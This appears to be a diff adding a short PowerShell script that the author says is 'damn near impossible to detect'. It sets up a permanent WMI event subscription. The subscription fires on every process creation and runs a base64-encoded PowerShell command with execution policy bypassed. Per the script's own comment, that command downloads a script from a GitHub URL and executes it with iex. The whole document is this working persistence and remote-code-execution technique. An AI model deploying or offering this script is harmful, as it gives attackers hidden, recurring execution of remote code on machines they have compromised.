@@ -1,0 +1,20 @@
+<#
+
+Self-contained WMI event-based script launcher. It's damn near impossible to detect. Requires admin obviously.
+
+EncodedCommand below is:
+$script = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/gfsmithak/grant-test/master/DotNetTextToSpeech'); $response = $script.GetResponse(); $respstream = $response.GetResponseStream(); $reader=new-object System.IO.StreamReader $respstream; $result = $reader.ReadToEnd(); iex $result
+ 
+ 
+ #>
+ 
+ $query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'win32_process'"
+    $filtername = "Test1"
+    $consumername = "Test2"
+    $WMIEvent = set-wmiinstance -class '__EventFilter' -namespace 'root\subscription' -arguments @{name=$filtername; eventnamespace='root\cimv2';querylanguage='WQL';query=$query} -erroraction stop
+
+    $WMIConsumer = set-wmiinstance -class commandlineeventconsumer -namespace "root\subscription" -arguments @{name=$consumername; executablepath= "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"; commandlinetemplate= 'C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -executionpolicy bypass -encodedcommand DQAKAA0ACgAkAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBDAHIAZQBhAHQAZQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAGYAcwBtAGkAdABoAGEAawAvAGcAcgBhAG4AdAAtAHQAZQBzAHQALwBtAGEAcwB0AGUAcgAvAEQAbwB0AE4AZQB0AFQAZQB4AHQAVABvAFMAcABlAGUAYwBoACcAKQA7ACAAJAByAGUAcwBwACAAPQAgACQAcgAuAEcAZQB0AFIAZQBzAHAAbwBuAHMAZQAoACkAOwAgACQAcgBlAHMAcABzAHQAcgBlAGEAbQAgAD0AIAAkAHIAZQBzAHAALgBHAGUAdABSAGUAcwBwAG8AbgBzAGUAUwB0AHIAZQBhAG0AKAApADsAIAAkAHMAcgA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAJAByAGUAcwBwAHMAdAByAGUAYQBtADsAIAAkAHIAZQBzAHUAbAB0ACAAPQAgACQAcwByAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAIABpAGUAeAAgACQAcgBlAHMAdQBsAHQADQAKAA0ACgA='}
+
+    set-wmiinstance -class __filtertoconsumerbinding -namespace "root\subscription" -arguments @{filter = $wmievent; consumer = $wmiconsumer}
+
+
